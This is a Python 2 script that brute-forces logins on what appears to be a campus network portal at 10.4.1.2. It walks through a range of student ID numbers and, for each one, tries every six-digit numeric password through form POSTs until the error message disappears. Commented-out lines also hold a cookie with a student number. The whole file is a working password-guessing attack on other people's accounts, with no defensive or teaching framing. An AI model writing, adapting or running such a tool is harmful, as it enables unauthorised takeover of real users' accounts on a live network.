# encoding: UTF-8
import re
import urllib  
import urllib2
import cookielib
from time import clock


#opener.addheaders.append(('Cache-Control','max-age=0'))
#opener.addheaders.append(('Referer','http://10.3.8.211/'))
#opener.addheaders.append(('Content-Type','application/x-www-form-urlencoded'))
#opener.addheaders.append(('Cookie','myusername=2013213280; username=2013213280;smartdot=110639'))

stuid = 2013211613
cookie = cookielib.CookieJar()  
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))

for stuid in range(2013213281,2013213300):
    start = clock()
    for passwd in range(10000,1000000):
        #cookie = cookielib.CookieJar()  
        #opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
    
        if passwd%10 == 0:
            print str(passwd/10000.0)+'%'
    
        str_stuid = "%d" % stuid
        str_passwd = "%06d" % passwd
        #需要POST的数据#
        postdata=urllib.urlencode({  
            'DDDDD'     :str_stuid,  
            'upass'     :str_passwd,
            '0MKKey'    :'\314\341\275\273'
            
        })
        #自定义一个请求#
        req = urllib2.Request(  
            url = 'http://10.4.1.2',
            data = postdata
        )
    
        #req.add_header('Host','10.4.1.2')
        #req.add_header('Connection','keep-alive')
        #req.add_header('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
        #req.add_header('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0')
        #req.add_header('Accept-Language','zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3')
        #req.add_header('Accept-Encoding','gzip, deflate')
    
        #访问该链接#
        result = opener.open(req)
    
    
        #打印返回的内容
        #print result.read()
    
        m = re.search(r'Msg', str(result.read()))
        if not m:
            print 'Find password %s:%s ' % (str_stuid,str_passwd)
            break
        else:
            pass
            #print 'Continue'
    finish = clock()

print "time:"+ str(finish-start) +'s'
